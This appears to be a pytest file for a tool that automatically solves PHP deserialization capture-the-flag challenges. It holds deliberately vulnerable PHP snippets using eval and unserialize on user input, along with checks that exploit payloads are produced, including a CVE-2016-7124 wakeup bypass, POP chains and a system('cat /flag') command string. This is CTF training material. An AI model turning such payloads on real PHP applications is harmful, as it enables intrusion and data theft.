"""
Tests for the PHPSerialize Auto-Solver engine.
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from engine.serializer import (
    php_serialize, php_unserialize, php_object,
    make_protected_key, make_private_key
)
from engine.analyzer import PHPSourceAnalyzer
from engine.payload import PayloadGenerator
from engine.flag_extractor import extract_flags, extract_first_flag


def test_serializer_basic():
    """Test basic PHP serialization types."""
    assert php_serialize(None) == 'N;', "Null serialization failed"
    assert php_serialize(True) == 'b:1;', "Bool true failed"
    assert php_serialize(False) == 'b:0;', "Bool false failed"
    assert php_serialize(123) == 'i:123;', "Int failed"
    assert php_serialize("Hello") == 's:5:"Hello";', "String failed"


def test_serializer_array():
    """Test array serialization."""
    result = php_serialize({'a': 'Plz', 'b': 'Give_M3'})
    assert 'a:2:' in result
    assert 'Plz' in result
    assert 'Give_M3' in result


def test_serializer_object():
    """Test object serialization."""
    obj = php_object('FLAG', flag_command="system('cat /flag');")
    ser = php_serialize(obj)
    assert 'O:4:"FLAG":1:' in ser
    assert 'flag_command' in ser


def test_protected_key():
    """Test protected property key generation."""
    pk = make_protected_key('flag')
    assert '\x00*\x00flag' == pk


def test_private_key():
    """Test private property key generation."""
    prk = make_private_key('FLAG', 'flag')
    assert '\x00FLAG\x00flag' == prk


def test_unserialize():
    """Test PHP unserialization."""
    assert php_unserialize('N;') is None
    assert php_unserialize('b:1;') is True
    assert php_unserialize('b:0;') is False
    assert php_unserialize('i:42;') == 42
    assert php_unserialize('s:5:"Hello";') == "Hello"


def test_analyzer_level1():
    """Test analyzer on Level 1 source code."""
    source = '''<?php
class FLAG {
    public $flag_string = "HelloCTF{test_flag}";
    function __construct() {
        echo $this->flag_string;
    }
}
$code = $_POST['code'];
if(isset($code)){
    if(stripos($code, "new") === false) {
        echo "error";
    } else {
        eval($code);
    }
}
'''
    analyzer = PHPSourceAnalyzer()
    result = analyzer.analyze(source)

    assert len(result.classes) == 1
    assert result.classes[0].name == 'FLAG'
    assert len(result.classes[0].properties) == 1
    assert result.classes[0].properties[0].name == 'flag_string'
    assert result.classes[0].properties[0].visibility == 'public'
    assert len(result.sinks) >= 1
    assert any(s.type == 'eval' for s in result.sinks)
    assert len(result.inputs) >= 1
    assert any(i.name == 'code' for i in result.inputs)
    assert result.strategy == 'eval_injection'


def test_analyzer_level7():
    """Test analyzer on Level 7 source (unserialize + backdoor)."""
    source = '''<?php
class FLAG {
    public $flag_command = "echo 'Hello CTF!';";
    function backdoor() {
        eval($this->flag_command);
    }
}
if(isset($_POST['o'])) {
    unserialize($_POST['o'])->backdoor();
}
'''
    analyzer = PHPSourceAnalyzer()
    result = analyzer.analyze(source)

    assert len(result.classes) == 1
    assert result.classes[0].name == 'FLAG'
    assert any(s.type == 'unserialize' for s in result.sinks)
    assert any(i.name == 'o' for i in result.inputs)


def test_analyzer_level11_cve():
    """Test analyzer detecting CVE-2016-7124 pattern."""
    source = '''<?php
class FLAG {
    public $flag = "FAKEFLAG";
    public function __wakeup() {
        global $flag;
        $flag = NULL;
    }
    public function __destruct() {
        global $flag;
        if ($flag !== NULL) {
            echo $flag;
        }
    }
}
if(isset($_POST['o'])) {
    unserialize($_POST['o']);
}
'''
    analyzer = PHPSourceAnalyzer()
    result = analyzer.analyze(source)

    assert len(result.classes) == 1
    assert result.classes[0].name == 'FLAG'
    has_wakeup = any(m.name == '__wakeup' for m in result.classes[0].methods)
    has_destruct = any(m.name == '__destruct' for m in result.classes[0].methods)
    assert has_wakeup
    assert has_destruct


def test_payload_generator_eval():
    """Test payload generation for eval injection."""
    source = '''<?php
class FLAG {
    public $flag_string = "HelloCTF{test}";
    function __construct() { echo $this->flag_string; }
}
$code = $_POST['code'];
if(isset($code)) { eval($code); }
'''
    analyzer = PHPSourceAnalyzer()
    analysis = analyzer.analyze(source)
    generator = PayloadGenerator()
    payloads = generator.generate(analysis)

    assert len(payloads) > 0
    # Should have at least one payload with 'new FLAG()'
    eval_payloads = [p for p in payloads if p.strategy == 'eval_injection']
    assert len(eval_payloads) > 0
    assert any('new FLAG()' in p.raw_code or 'new FLAG()' in str(p.data)
               for p in eval_payloads)


def test_payload_generator_unserialize():
    """Test payload generation for unserialize injection."""
    source = '''<?php
class FLAG {
    public $flag_command = "echo 'test';";
    function backdoor() { eval($this->flag_command); }
}
if(isset($_POST['o'])) { unserialize($_POST['o'])->backdoor(); }
'''
    analyzer = PHPSourceAnalyzer()
    analysis = analyzer.analyze(source)
    generator = PayloadGenerator()
    payloads = generator.generate(analysis)

    assert len(payloads) > 0
    # Should have serialized payloads
    serialized = [p for p in payloads if p.serialized_string]
    assert len(serialized) > 0


def test_flag_extractor():
    """Test flag extraction from response text."""
    text = "Some output... HelloCTF{Th1s_1s_4_F14g} and more text..."
    flags = extract_flags(text)
    assert len(flags) >= 1
    assert 'HelloCTF{Th1s_1s_4_F14g}' in flags

    first = extract_first_flag(text)
    assert first == 'HelloCTF{Th1s_1s_4_F14g}'


def test_flag_extractor_multiple():
    """Test multiple flag patterns."""
    text = "Flag1: FLAG{test123} and Flag2: CTF{another_flag_here}"
    flags = extract_flags(text)
    assert len(flags) >= 2


def test_wakeup_bypass_payload():
    """Test CVE-2016-7124 payload generation."""
    source = '''<?php
class FLAG {
    public $flag = "FAKEFLAG";
    public function __wakeup() { global $flag; $flag = NULL; }
    public function __destruct() { global $flag; if($flag !== NULL){ echo $flag; } }
}
if(isset($_POST['o'])) { unserialize($_POST['o']); }
'''
    analyzer = PHPSourceAnalyzer()
    analysis = analyzer.analyze(source)
    generator = PayloadGenerator()
    payloads = generator.generate(analysis)

    # Should have a CVE-2016-7124 bypass payload
    bypass = [p for p in payloads if p.strategy == 'wakeup_bypass']
    assert len(bypass) > 0, f"No bypass payloads found in {len(payloads)} payloads"
    # Check that the property count is inflated
    serialized = bypass[0].serialized_string
    assert serialized is not None
    # The property count should be 2 (real count 1 + 1)
    assert '"FLAG":2:' in serialized or ':2:{' in serialized


def test_pop_chain_level16():
    """Test POP chain detection for Level 16 pattern."""
    source = '''<?php
class A { public $a; public function __invoke() { include $this->a; return $flag; } }
class B { public $b; public function __toString() { $f = $this->b; return $f(); } }
class INIT { public $name; public function __wakeUp() { echo $this->name.' is awake!'; } }
if(isset($_POST['o'])) { unserialize($_POST['o']); }
'''
    analyzer = PHPSourceAnalyzer()
    analysis = analyzer.analyze(source)
    generator = PayloadGenerator()
    payloads = generator.generate(analysis)

    # Should detect the INIT -> B -> A chain
    pop_payloads = [p for p in payloads if 'INIT' in (p.description or '')]
    assert len(pop_payloads) > 0, f"No INIT chain payloads found"


def test_string_escape_level18():
    """Test string escape detection for Level 18."""
    source = '''<?php
class Demo { public $a="Hello"; public $b="CTF"; public $key = 'GET_FLAG";}FAKE_FLAG'; }
class FLAG { }
$target = $_GET['target']; $change = $_GET['change'];
$s = str_replace($target, $change, serialize(new Demo()));
$FLAG = unserialize($s);
if($FLAG instanceof FLAG && $FLAG->key == 'GET_FLAG') { include 'flag.php'; echo $flag; }
'''
    analyzer = PHPSourceAnalyzer()
    analysis = analyzer.analyze(source)

    # Should detect string_escape strategy
    assert analysis.strategy in ('string_escape', 'pop_chain',
                                  'unserialize_injection', 'unknown'), \
        f"Unexpected strategy: {analysis.strategy}"

    generator = PayloadGenerator()
    payloads = generator.generate(analysis)
    assert len(payloads) > 0


if __name__ == '__main__':
    import pytest
    sys.exit(pytest.main([__file__, '-v']))
